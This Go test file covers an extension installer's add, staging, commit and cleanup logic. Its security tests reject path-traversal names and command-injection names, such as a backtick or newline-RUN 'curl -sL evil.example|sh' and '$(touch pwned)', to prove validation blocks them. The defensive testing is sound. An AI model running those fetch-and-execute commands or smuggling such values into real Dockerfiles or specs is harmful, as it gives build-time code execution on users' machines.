// Copyright (C) 2026 EclipseSource GmbH and others.
//
// This program and the accompanying materials are made available under the
// terms of the MIT License, which is available in the project root.
//
// SPDX-License-Identifier: MIT

package extinstall

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	"enclave/internal/model"
)

const fooFeatureSpec = "schemaVersion: \"1\"\nkind: mixin\nname: foo\ndescription: A test feature\n"

func fooRepoFiles() map[string]string {
	return map[string]string{
		"extensions/features/foo/spec.yaml":  fooFeatureSpec,
		"extensions/features/foo/install.sh": "#!/bin/sh\necho foo\n",
		"README.md":                          "docs\n",
	}
}

func addRequest(names ...string) Request {
	return Request{Kind: model.KindFeature, Op: OpAdd, Source: "acme/kits", Names: names, Yes: true}
}

func TestAddInstallsDiscoveredFeature(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")

	results, err := Add(context.Background(), env, addRequest())
	if err != nil {
		t.Fatalf("Add: %v", err)
	}
	if len(results) != 1 || results[0].Action != ActionInstalled {
		t.Fatalf("results = %s", fmtResults(results))
	}

	installed := filepath.Join(env.Paths.UserFeaturesDir, "foo")
	if _, err := os.Stat(filepath.Join(installed, "spec.yaml")); err != nil {
		t.Fatalf("spec not installed: %v", err)
	}
	origin, err := readOrigin(installed)
	if err != nil || origin == nil {
		t.Fatalf("readOrigin = %v, %v", origin, err)
	}
	if origin.Commit != fetcher.repo.commit || origin.Ref != "main" || origin.RefType != RefTypeBranch {
		t.Fatalf("origin = %+v", *origin)
	}
	if origin.Subpath != "extensions/features/foo" {
		t.Errorf("origin subpath = %q", origin.Subpath)
	}
	if origin.TreeHash == "" {
		t.Error("origin has no tree hash")
	}
	modified, err := isLocallyModified(installed, *origin)
	if err != nil || modified {
		t.Fatalf("freshly installed extension reported modified=%v (%v)", modified, err)
	}
}

func TestAddLeavesNoStagingDirectories(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")
	if _, err := Add(context.Background(), env, addRequest()); err != nil {
		t.Fatalf("Add: %v", err)
	}

	entries, err := os.ReadDir(env.Paths.UserFeaturesDir)
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), ".") {
			t.Fatalf("staging leftover: %s", entry.Name())
		}
	}
}

func TestAddRejectsWrongKind(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")

	req := addRequest()
	req.Kind = model.KindTool
	_, err := Add(context.Background(), env, req)
	if err == nil {
		t.Fatal("Add installed a mixin as a tool")
	}
	if !strings.Contains(err.Error(), "enclave features add") {
		t.Fatalf("error does not name the right verb: %v", err)
	}
}

func TestAddRequiresSelectionForMultipleCandidates(t *testing.T) {
	files := fooRepoFiles()
	files["extensions/features/bar/spec.yaml"] = "schemaVersion: \"1\"\nkind: mixin\nname: bar\n"
	fetcher := newFakeFetcher(t, "a1b2c3d4", files)
	env, _ := testEnv(t, fetcher, "")

	// --yes with neither --all nor --name must not guess.
	if _, err := Add(context.Background(), env, addRequest()); err == nil {
		t.Fatal("Add installed everything without --all")
	}

	req := addRequest()
	req.All = true
	results, err := Add(context.Background(), env, req)
	if err != nil {
		t.Fatalf("Add --all: %v", err)
	}
	if len(results) != 2 {
		t.Fatalf("results = %s, want two", fmtResults(results))
	}

	single := addRequest("bar")
	single.Source = "acme/kits"
	results, err = Add(context.Background(), env, single)
	if err != nil {
		t.Fatalf("Add --name: %v", err)
	}
	if len(results) != 1 || results[0].Name != "bar" {
		t.Fatalf("results = %s", fmtResults(results))
	}
}

func TestAddRefusesExistingDirectoryWithoutForce(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")
	existing := filepath.Join(env.Paths.UserFeaturesDir, "foo")
	writeFixture(t, filepath.Join(existing, "spec.yaml"), "schemaVersion: \"1\"\nkind: mixin\nname: foo\n", 0o644)
	writeFixture(t, filepath.Join(existing, "hand-written.txt"), "mine\n", 0o644)

	results, err := Add(context.Background(), env, addRequest())
	if err == nil && !HasFailure(results) {
		t.Fatalf("Add overwrote an unmanaged directory: %s", fmtResults(results))
	}
	if _, statErr := os.Stat(filepath.Join(existing, "hand-written.txt")); statErr != nil {
		t.Fatalf("unmanaged content was destroyed: %v", statErr)
	}

	req := addRequest()
	req.Force = true
	results, err = Add(context.Background(), env, req)
	if err != nil {
		t.Fatalf("Add --force: %v", err)
	}
	if len(results) != 1 || results[0].Action != ActionInstalled {
		t.Fatalf("results = %s", fmtResults(results))
	}
	origin, err := readOrigin(existing)
	if err != nil || origin == nil {
		t.Fatalf("forced install did not become managed: %v, %v", origin, err)
	}
}

// TestAddRefusesShadowingBuiltinWithoutForce: a name that exists only as a
// built-in (no user directory at all) must still require --force. The overlay
// is per-file, so an untrusted source's install.sh would replace the
// built-in's and then run at image build, possibly as root under needsRoot.
func TestAddRefusesShadowingBuiltinWithoutForce(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")
	builtinDir := filepath.Join(env.Paths.FeaturesDir, "foo")
	writeFixture(t, filepath.Join(builtinDir, "spec.yaml"), fooFeatureSpec, 0o644)
	writeFixture(t, filepath.Join(builtinDir, "install.sh"), "#!/bin/sh\necho builtin\n", 0o755)
	builtinBefore := snapshotTree(t, builtinDir)

	results, err := Add(context.Background(), env, addRequest())
	if err == nil && !HasFailure(results) {
		t.Fatalf("Add silently shadowed a built-in: %s", fmtResults(results))
	}
	message := ""
	switch {
	case err != nil:
		message = err.Error()
	case len(results) > 0:
		message = results[0].Error
	}
	if !strings.Contains(message, "built-in") {
		t.Fatalf("error does not say the install would shadow a built-in: %v", message)
	}
	if len(results) > 0 && results[0].Name != "foo" {
		t.Fatalf("results = %s, want the refusal attributed to foo", fmtResults(results))
	}
	assertResultsDoNotNameExtensions(t, results)
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "foo")); !os.IsNotExist(statErr) {
		t.Fatalf("refused install still wrote a user directory: %v", statErr)
	}
	if diff := snapshotTree(t, builtinDir); len(diff) != len(builtinBefore) {
		t.Fatalf("built-in files were touched by the refused install: before=%v after=%v", builtinBefore, diff)
	}

	req := addRequest()
	req.Force = true
	results, err = Add(context.Background(), env, req)
	if err != nil {
		t.Fatalf("Add --force: %v", err)
	}
	if len(results) != 1 || results[0].Action != ActionInstalled {
		t.Fatalf("results = %s", fmtResults(results))
	}
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "foo", "spec.yaml")); statErr != nil {
		t.Fatalf("forced install did not write the user overlay: %v", statErr)
	}
	if after := snapshotTree(t, builtinDir); !reflect.DeepEqual(builtinBefore, after) {
		t.Fatalf("built-in files were touched by --force: before=%v after=%v", builtinBefore, after)
	}
}

// TestAddOptInFeaturePrintsEnableHint covers the hint an opt-in feature needs:
// installing it rebuilds the image, but it stays inactive until it is enabled.
// The flag comes from the capabilities inspect already computed, so nothing
// re-reads the installed spec to answer it.
func TestAddOptInFeaturePrintsEnableHint(t *testing.T) {
	optIn := map[string]string{
		"extensions/features/optin/spec.yaml": "schemaVersion: \"1\"\nkind: mixin\nname: optin\ndefaultEnabled: false\n",
	}
	env, out := testEnv(t, newFakeFetcher(t, "a1b2c3d4", optIn), "")
	if _, err := Add(context.Background(), env, addRequest()); err != nil {
		t.Fatalf("Add: %v", err)
	}
	if !strings.Contains(out.String(), "enable it with: enclave --features +optin") {
		t.Fatalf("opt-in feature install printed no enable hint:\n%s", out.String())
	}

	// A feature that is enabled by default must not be told to enable itself.
	onByDefault, defaultOut := testEnv(t, newFakeFetcher(t, "a1b2c3d4", fooRepoFiles()), "")
	if _, err := Add(context.Background(), onByDefault, addRequest()); err != nil {
		t.Fatalf("Add: %v", err)
	}
	if strings.Contains(defaultOut.String(), "enable it with") {
		t.Fatalf("default-on feature was told to enable itself:\n%s", defaultOut.String())
	}
}

// TestAddAllKeepsValidationFailuresPerExtension pins the attribution of a
// staged-validation failure when several extensions are installed in one run:
// the invalid one fails, and every other selected extension is installed and
// judged on its own content.
func TestAddAllKeepsValidationFailuresPerExtension(t *testing.T) {
	files := map[string]string{
		// Same invalid port as TestAddValidationFailureWritesNothing: accepted
		// by discovery, rejected by staged validation. "bad" sorts before
		// "good", so it is staged first.
		"extensions/features/bad/spec.yaml":  "schemaVersion: \"1\"\nkind: mixin\nname: bad\nports:\n  - container: 99999\n",
		"extensions/features/good/spec.yaml": "schemaVersion: \"1\"\nkind: mixin\nname: good\n",
	}
	env, _ := testEnv(t, newFakeFetcher(t, "a1b2c3d4", files), "")
	req := addRequest()
	req.All = true

	results, err := Add(context.Background(), env, req)
	if err != nil {
		t.Fatalf("Add --all: %v", err)
	}
	if len(results) != 2 {
		t.Fatalf("results = %s, want one per selected extension", fmtResults(results))
	}
	byName := map[string]ActionResult{}
	for _, result := range results {
		byName[result.Name] = result
	}
	if byName["bad"].Action != ActionFailed {
		t.Errorf("bad = %s, want the invalid extension to fail", byName["bad"].Action)
	}
	if !strings.Contains(byName["bad"].Error, "bad") {
		t.Errorf("bad error = %q, want it to describe the invalid extension", byName["bad"].Error)
	}
	if byName["good"].Action != ActionInstalled {
		t.Errorf("good = %s (%s), want the valid extension installed on its own merits",
			byName["good"].Action, byName["good"].Error)
	}
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "good", "spec.yaml")); statErr != nil {
		t.Errorf("valid extension was not installed: %v", statErr)
	}
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "bad")); !os.IsNotExist(statErr) {
		t.Errorf("invalid extension was installed anyway (%v)", statErr)
	}
}

// TestAddDryRunAllValidatesEachExtensionOnce is the cost regression test for
// --all: nothing is committed on a dry run, so a staged copy left behind in
// the shared staging root would make every extension re-validate all the ones
// before it. Each warning must be reported exactly once.
func TestAddDryRunAllValidatesEachExtensionOnce(t *testing.T) {
	files := map[string]string{}
	for _, name := range []string{"one", "two", "three"} {
		dir := "extensions/features/" + name
		files[dir+"/spec.yaml"] = "schemaVersion: \"1\"\nkind: mixin\nname: " + name + "\n"
		// A user go/ directory is ignored by the build, which staged
		// validation reports as a warning for this extension.
		files[dir+"/go/handler.go"] = "package main\n"
	}
	env, out := testEnv(t, newFakeFetcher(t, "a1b2c3d4", files), "")
	req := addRequest()
	req.All = true
	req.DryRun = true

	results, err := Add(context.Background(), env, req)
	if err != nil {
		t.Fatalf("Add --all --dry-run: %v", err)
	}
	if len(results) != 3 {
		t.Fatalf("results = %s, want one per extension", fmtResults(results))
	}
	for _, name := range []string{"one", "two", "three"} {
		warning := fmt.Sprintf("feature %q: user go/ handlers are ignored", name)
		if got := strings.Count(out.String(), warning); got != 1 {
			t.Errorf("warning for %q reported %d times, want 1:\n%s", name, got, out.String())
		}
	}
}

func TestAddValidationFailureWritesNothing(t *testing.T) {
	files := map[string]string{
		// A container port outside 1-65535 parses fine (SummarizeSpecDir does
		// not range-check it, so classify accepts the candidate), but
		// LoadFeatureExtension's normalizePortConfigs rejects it. The failure
		// must come from staged validation, not from discovery.
		"extensions/features/foo/spec.yaml": "schemaVersion: \"1\"\nkind: mixin\nname: foo\nports:\n  - container: 99999\n",
	}
	fetcher := newFakeFetcher(t, "a1b2c3d4", files)
	env, _ := testEnv(t, fetcher, "")

	results, err := Add(context.Background(), env, addRequest())
	if err == nil && !HasFailure(results) {
		t.Fatalf("Add accepted an invalid spec: %s", fmtResults(results))
	}
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "foo")); !os.IsNotExist(statErr) {
		t.Fatalf("invalid extension was installed anyway (%v)", statErr)
	}
}

func TestAddDryRunWritesNothing(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, out := testEnv(t, fetcher, "")
	req := addRequest()
	req.DryRun = true

	if _, err := Add(context.Background(), env, req); err != nil {
		t.Fatalf("Add --dry-run: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "foo")); !os.IsNotExist(statErr) {
		t.Fatal("--dry-run installed the extension")
	}
	if !strings.Contains(out.String(), "foo") {
		t.Fatalf("--dry-run printed no summary:\n%s", out.String())
	}
}

// TestAddDryRunDoesNotCreateTheDestination holds the documented promise that a
// dry run never touches the destination down to the directory itself. Creating
// the user extension root is a lasting side effect on a host that has never
// installed one: config.HasUserExtensions reports true from then on, which
// costs every later build its app-root fast path.
func TestAddDryRunDoesNotCreateTheDestination(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")
	if err := os.RemoveAll(env.Paths.UserExtensionsDir); err != nil {
		t.Fatalf("clear the destination: %v", err)
	}

	req := addRequest()
	req.DryRun = true
	if _, err := Add(context.Background(), env, req); err != nil {
		t.Fatalf("Add --dry-run: %v", err)
	}
	if _, statErr := os.Stat(env.Paths.UserExtensionsDir); !os.IsNotExist(statErr) {
		t.Fatalf("--dry-run created the user extension root (stat err = %v)", statErr)
	}
}

func TestAddDeclinedAtPromptWritesNothing(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "n\n")
	req := addRequest()
	req.Yes = false
	req.Interactive = true

	results, err := Add(context.Background(), env, req)
	if err == nil && !HasFailure(results) {
		t.Fatalf("declining the prompt still succeeded: %s", fmtResults(results))
	}
	if _, statErr := os.Stat(filepath.Join(env.Paths.UserFeaturesDir, "foo")); !os.IsNotExist(statErr) {
		t.Fatal("declined install wrote files")
	}
}

func TestAddExplicitPathSkipsDiscovery(t *testing.T) {
	files := fooRepoFiles()
	files["extensions/features/bar/spec.yaml"] = "schemaVersion: \"1\"\nkind: mixin\nname: bar\n"
	fetcher := newFakeFetcher(t, "a1b2c3d4", files)
	env, _ := testEnv(t, fetcher, "")

	req := addRequest()
	req.Path = "extensions/features/bar"
	results, err := Add(context.Background(), env, req)
	if err != nil {
		t.Fatalf("Add --path: %v", err)
	}
	if len(results) != 1 || results[0].Name != "bar" {
		t.Fatalf("results = %s", fmtResults(results))
	}
}

// TestAddRejectsNameCollisionAcrossDirectories covers two extensions in
// different directories of one repository sharing a base name, distinguished
// only by Dir. selectExtensions must not silently pick one over the other via
// a byName map; Add must refuse the whole install, naming both directories,
// regardless of --name/--all/prompt, and before anything is staged.
func TestAddRejectsNameCollisionAcrossDirectories(t *testing.T) {
	files := map[string]string{
		"a/foo/spec.yaml": "schemaVersion: \"1\"\nkind: mixin\nname: foo\n",
		"b/foo/spec.yaml": "schemaVersion: \"1\"\nkind: mixin\nname: foo\n",
	}
	fetcher := newFakeFetcher(t, "a1b2c3d4", files)
	env, _ := testEnv(t, fetcher, "")

	assertCollision := func(t *testing.T, req Request) {
		t.Helper()
		results, err := Add(context.Background(), env, req)
		if err == nil {
			t.Fatalf("Add installed a colliding name: %s", fmtResults(results))
		}
		if !strings.Contains(err.Error(), "a/foo") || !strings.Contains(err.Error(), "b/foo") {
			t.Fatalf("error does not name both directories: %v", err)
		}
	}

	t.Run("no selector", func(t *testing.T) { assertCollision(t, addRequest()) })
	t.Run("all", func(t *testing.T) {
		req := addRequest()
		req.All = true
		assertCollision(t, req)
	})
	t.Run("name", func(t *testing.T) { assertCollision(t, addRequest("foo")) })

	entries, err := os.ReadDir(env.Paths.UserFeaturesDir)
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("collision installed something: %v", entries)
	}
}

func TestRemoveInstalledDeletesManagedDirectory(t *testing.T) {
	fetcher := newFakeFetcher(t, "a1b2c3d4", fooRepoFiles())
	env, _ := testEnv(t, fetcher, "")
	if _, err := Add(context.Background(), env, addRequest()); err != nil {
		t.Fatalf("Add: %v", err)
	}
	installed := filepath.Join(env.Paths.UserFeaturesDir, "foo")
	if _, err := os.Stat(installed); err != nil {
		t.Fatalf("precondition: %v", err)
	}

	if err := removeInstalled(env, model.KindFeature, "foo"); err != nil {
		t.Fatalf("removeInstalled: %v", err)
	}
	if _, err := os.Stat(installed); !os.IsNotExist(err) {
		t.Fatalf("removeInstalled left the directory behind: %v", err)
	}
}

// TestValidExtensionNameRejectsUnsafeNames pins validExtensionName's exact
// behavior directly (as opposed to only through Add, which cannot reach every
// case: a real git tree can never hand classify a directory-derived name
// containing "/" or "\", so the end-to-end path below only exercises the
// root-level, spec-declared-name route). This is the single guard standing
// between an untrusted repository's spec.yaml and a write outside the staging
// root; see TestAddRejectsTraversalNameEndToEnd for proof that removing it is
// exploitable, not just theoretically wrong.
func TestValidExtensionNameRejectsUnsafeNames(t *testing.T) {
	rejected := []string{
		"..", "../../../etc/evil", ".", "", "a/b", "a\\b", "/etc/passwd", "..\\evil", ".evil", ".hidden-name",
		// Shell and Dockerfile metacharacters: the name is interpolated into
		// generated Dockerfile instructions, so a name that is a usable
		// filename can still be unusable as an identity. See
		// TestAddRejectsMetacharacterNameEndToEnd.
		"jq-helper$(id)", "jq-helper`id`", "jq helper", "jq-helper\nRUN id",
	}
	for _, name := range rejected {
		if err := validExtensionName(name); err == nil {
			t.Errorf("validExtensionName(%q) = nil, want an error", name)
		}
	}

	accepted := []string{"foo", "foo-bar", "foo_bar", "foo.bar", "claude-code"}
	for _, name := range accepted {
		if err := validExtensionName(name); err != nil {
			t.Errorf("validExtensionName(%q) = %v, want nil", name, err)
		}
	}
}

// snapshotTree records every path under root and its mode, so a test can
// assert that an operation touched nothing beyond a specific, expected set of
// paths — including paths a path-traversal bug might create outside any
// directory the test otherwise inspects.
func snapshotTree(t *testing.T, root string) map[string]fs.FileMode {
	t.Helper()
	snap := map[string]fs.FileMode{}
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		rel, relErr := filepath.Rel(root, path)
		if relErr != nil {
			return relErr
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			return infoErr
		}
		snap[rel] = info.Mode()
		return nil
	})
	if err != nil {
		t.Fatalf("snapshotTree(%s): %v", root, err)
	}
	return snap
}

// TestAddRejectsTraversalNameEndToEnd is the regression test for the
// path-traversal guard in validExtensionName. A repository-root spec.yaml
// (the only discovery path where the installed name comes straight from the
// untrusted spec document rather than a git-tree directory name) declaring a
// traversal or bare ".." name must be rejected by Add, and must leave every
// byte on disk exactly as it was: not just the destination directory, but
// everything under the test's temp root, since a successful traversal would
// land somewhere else under there.
func TestAddRejectsTraversalNameEndToEnd(t *testing.T) {
	rootSpec := func(name string) map[string]string {
		return map[string]string{
			"spec.yaml":  "schemaVersion: \"1\"\nkind: mixin\nname: " + name + "\n",
			"install.sh": "#!/bin/sh\necho evil\n",
		}
	}

	cases := []string{"..", "../../../etc/evil"}
	for _, name := range cases {
		t.Run(name, func(t *testing.T) {
			fetcher := newFakeFetcher(t, "a1b2c3d4", rootSpec(name))
			env, _ := testEnv(t, fetcher, "")
			root := filepath.Dir(env.Home)

			// --force: without it, planFor's "already installed" check rejects
			// the ".." case first (kindDir/".." always exists) and masks the
			// guard under test.
			req := addRequest()
			req.Force = true
			before := snapshotTree(t, root)
			results, err := Add(context.Background(), env, req)
			if err == nil && !HasFailure(results) {
				t.Fatalf("Add accepted traversal name %q: %s", name, fmtResults(results))
			}

			entries, readErr := os.ReadDir(env.Paths.UserFeaturesDir)
			if readErr != nil {
				t.Fatalf("ReadDir: %v", readErr)
			}
			if len(entries) != 0 {
				t.Fatalf("destination is not untouched: %v", entries)
			}

			after := snapshotTree(t, root)
			if len(before) != len(after) {
				t.Fatalf("traversal wrote outside the destination:\nbefore=%v\nafter=%v", before, after)
			}
			for path, mode := range before {
				if after[path] != mode {
					t.Fatalf("path %q changed (before=%v after=%v)", path, mode, after[path])
				}
			}
		})
	}
}

// TestAddRejectsMetacharacterNameEndToEnd covers the other half of what an
// untrusted spec-declared name can reach. A name needs no path separator to be
// dangerous: it becomes a directory under the user extension root, is copied
// into the docker build context, and is interpolated into generated Dockerfile
// instructions, where a shell-form RUN reaches it through /bin/sh -c and a
// newline starts a fresh instruction. A name carrying "$(...)", a backtick, or
// a newline therefore buys build-time code execution that no row of the
// capability summary describes — an extension declaring nothing but an apt
// package would run it — so Add must refuse the name outright.
func TestAddRejectsMetacharacterNameEndToEnd(t *testing.T) {
	names := []string{
		"jq-helper$(touch pwned)",
		"jq-helper`curl -sL evil.example|sh`",
		"jq-helper\nRUN curl -sL evil.example|sh #",
	}
	for _, name := range names {
		t.Run(name, func(t *testing.T) {
			spec := "schemaVersion: \"1\"\nkind: mixin\nname: " + strconv.Quote(name) + "\naptPackages: [jq]\n"
			fetcher := newFakeFetcher(t, "a1b2c3d4", map[string]string{"spec.yaml": spec})
			env, out := testEnv(t, fetcher, "")
			root := filepath.Dir(env.Home)

			before := snapshotTree(t, root)
			results, err := Add(context.Background(), env, addRequest())
			if err == nil && !HasFailure(results) {
				t.Fatalf("Add accepted metacharacter name %q: %s", name, fmtResults(results))
			}
			if strings.Contains(out.String(), "installed") {
				t.Fatalf("Add reported an install:\n%s", out.String())
			}

			after := snapshotTree(t, root)
			if len(before) != len(after) {
				t.Fatalf("Add wrote to disk:\nbefore=%v\nafter=%v", before, after)
			}
			for path, mode := range before {
				if after[path] != mode {
					t.Fatalf("path %q changed (before=%v after=%v)", path, mode, after[path])
				}
			}
		})
	}
}

// TestAddRejectsDotPrefixedNameEndToEnd: every extension-root scan
// (config.ListExtensionDirNames, the loops behind config.ValidateExtensions)
// skips dot-prefixed directories, on the assumption
// that only this installer's own ".incoming-*"/".replaced-*" staging
// directories ever look like that. An extension installed under a
// dot-prefixed name — only possible from a repository-root spec, same as the
// traversal case above — would therefore be mountable while never being
// listed or validated again, so the name is rejected before anything is
// staged. The fixture is invalid for an unrelated reason (an out-of-range
// port, same spec as TestAddValidationFailureWritesNothing) so the sound-name
// case still fails at staged validation.
func TestAddRejectsDotPrefixedNameEndToEnd(t *testing.T) {
	filesFor := func(name string) map[string]string {
		return map[string]string{
			"spec.yaml": "schemaVersion: \"1\"\nkind: mixin\nname: " + name + "\nports:\n  - container: 99999\n",
		}
	}

	t.Run("rejected before staging", func(t *testing.T) {
		fetcher := newFakeFetcher(t, "a1b2c3d4", filesFor(".evil"))
		env, _ := testEnv(t, fetcher, "")

		results, err := Add(context.Background(), env, addRequest())
		if err == nil && !HasFailure(results) {
			t.Fatalf("Add accepted a dot-prefixed name: %s", fmtResults(results))
		}

		entries, readErr := os.ReadDir(env.Paths.UserFeaturesDir)
		if readErr != nil {
			t.Fatalf("ReadDir: %v", readErr)
		}
		if len(entries) != 0 {
			t.Fatalf("a dot-prefixed name left something behind: %v", entries)
		}
	})

	// Same invalid content under a normal name is the control: it must also
	// fail, just later (in staged validation, not name-checking), proving the
	// content itself is genuinely invalid and not merely a name-check false
	// positive.
	t.Run("normal name also invalid", func(t *testing.T) {
		fetcher := newFakeFetcher(t, "a1b2c3d4", filesFor("badnormal"))
		env, _ := testEnv(t, fetcher, "")

		results, err := Add(context.Background(), env, addRequest())
		if err == nil && !HasFailure(results) {
			t.Fatalf("Add accepted an out-of-range port: %s", fmtResults(results))
		}
	})
}

// TestStagingCommitInvokesStampAfterSwap pins the ordering commit's doc
// comment promises: stamp only runs once the swap is visible at
// installedPath, and while the lock commit acquired is still held — the
// metadata write must be part of the same critical section as the swap, not a
// separate step that runs after the lock is released.
func TestStagingCommitInvokesStampAfterSwap(t *testing.T) {
	env, _ := testEnv(t, nil, "")
	stage, err := newStaging(env, model.KindFeature, false)
	if err != nil {
		t.Fatalf("newStaging: %v", err)
	}
	writeFixture(t, filepath.Join(stage.extDir("foo"), "spec.yaml"), fooFeatureSpec, 0o644)

	var sawContentAtStamp bool
	installedPath, err := stage.commit(env, "foo", func(installedPath string) error {
		_, statErr := os.Stat(filepath.Join(installedPath, "spec.yaml"))
		sawContentAtStamp = statErr == nil
		return nil
	})
	if err != nil {
		t.Fatalf("commit: %v", err)
	}
	if !sawContentAtStamp {
		t.Fatal("stamp ran before the swap was visible at installedPath")
	}
	if _, err := os.Stat(filepath.Join(installedPath, "spec.yaml")); err != nil {
		t.Fatalf("commit did not leave the swapped content in place: %v", err)
	}
}

// TestStagingCommitStampFailureRestoresPreviousState covers the unwind path:
// a stamp error must leave the destination exactly as it was before commit was
// called, the same guarantee a rename failure gives.
func TestStagingCommitStampFailureRestoresPreviousState(t *testing.T) {
	env, _ := testEnv(t, nil, "")
	stage, err := newStaging(env, model.KindFeature, false)
	if err != nil {
		t.Fatalf("newStaging: %v", err)
	}
	existing := filepath.Join(env.Paths.UserFeaturesDir, "foo")
	writeFixture(t, filepath.Join(existing, "marker.txt"), "old\n", 0o644)
	writeFixture(t, filepath.Join(stage.extDir("foo"), "marker.txt"), "new\n", 0o644)

	wantErr := errors.New("stamp boom")
	_, err = stage.commit(env, "foo", func(string) error { return wantErr })
	if !errors.Is(err, wantErr) {
		t.Fatalf("commit error = %v, want %v", err, wantErr)
	}

	data, readErr := os.ReadFile(filepath.Join(existing, "marker.txt"))
	if readErr != nil {
		t.Fatalf("existing content was not restored: %v", readErr)
	}
	if string(data) != "old\n" {
		t.Fatalf("existing content = %q, want %q", data, "old\n")
	}

	entries, err := os.ReadDir(env.Paths.UserFeaturesDir)
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), replacedPrefix) {
			t.Fatalf("a %s leftover survived a restored stamp failure: %s", replacedPrefix, entry.Name())
		}
	}
}

// TestSweepStaleRespectsTouch: a staging directory whose mtime was refreshed
// (as applyPlan does around the confirmation prompt and the swap) must survive
// a sweep even though its original mtime was old enough to be swept.
func TestSweepStaleRespectsTouch(t *testing.T) {
	env, _ := testEnv(t, nil, "")
	stage, err := newStaging(env, model.KindFeature, false)
	if err != nil {
		t.Fatalf("newStaging: %v", err)
	}
	old := env.now().Add(-48 * time.Hour)
	if err := os.Chtimes(stage.root, old, old); err != nil {
		t.Fatalf("Chtimes: %v", err)
	}

	stage.touch(env)
	sweepStale(stage.kindDir, env.now())

	if _, statErr := os.Stat(stage.root); statErr != nil {
		t.Fatalf("touch did not protect a live staging directory from being swept: %v", statErr)
	}
}

// TestSweepStaleRemovesUntouchedOldDirectory is the complement of
// TestSweepStaleRespectsTouch: a staging directory nobody has touched in over
// staleAge is still swept.
func TestSweepStaleRemovesUntouchedOldDirectory(t *testing.T) {
	env, _ := testEnv(t, nil, "")
	stage, err := newStaging(env, model.KindFeature, false)
	if err != nil {
		t.Fatalf("newStaging: %v", err)
	}
	old := env.now().Add(-25 * time.Hour)
	if err := os.Chtimes(stage.root, old, old); err != nil {
		t.Fatalf("Chtimes: %v", err)
	}

	sweepStale(stage.kindDir, env.now())

	if _, statErr := os.Stat(stage.root); !os.IsNotExist(statErr) {
		t.Fatalf("a staging directory untouched for over staleAge was not swept: %v", statErr)
	}
}

// TestStagingCommitReplacedNamesAreUniquePerSwap: the "moved aside" directory
// name must vary per swap, not just per process. A leftover from an earlier
// interrupted swap of the same name (a crash between commit's two renames)
// would otherwise collide with a later swap from the same pid, and the rename
// onto that stale, non-empty directory would fail.
func TestStagingCommitReplacedNamesAreUniquePerSwap(t *testing.T) {
	env, _ := testEnv(t, nil, "")
	stage, err := newStaging(env, model.KindFeature, false)
	if err != nil {
		t.Fatalf("newStaging: %v", err)
	}

	// Simulate a leftover from an interrupted swap that used the old,
	// PID-only naming scheme (no separator, no per-swap component).
	staleLeftover := filepath.Join(stage.kindDir, fmt.Sprintf("%sfoo%d", replacedPrefix, os.Getpid()))
	writeFixture(t, filepath.Join(staleLeftover, "marker.txt"), "stale\n", 0o644)

	existing := filepath.Join(env.Paths.UserFeaturesDir, "foo")
	writeFixture(t, filepath.Join(existing, "marker.txt"), "old\n", 0o644)
	writeFixture(t, filepath.Join(stage.extDir("foo"), "marker.txt"), "new\n", 0o644)

	if _, err := stage.commit(env, "foo", nil); err != nil {
		t.Fatalf("commit collided with a stale leftover at the old naming scheme's path: %v", err)
	}
	if _, statErr := os.Stat(staleLeftover); statErr != nil {
		t.Fatalf("commit touched an unrelated stale directory at the old naming scheme's path: %v", statErr)
	}
	data, err := os.ReadFile(filepath.Join(existing, "marker.txt"))
	if err != nil || string(data) != "new\n" {
		t.Fatalf("swap did not complete as expected: %q, %v", data, err)
	}
}
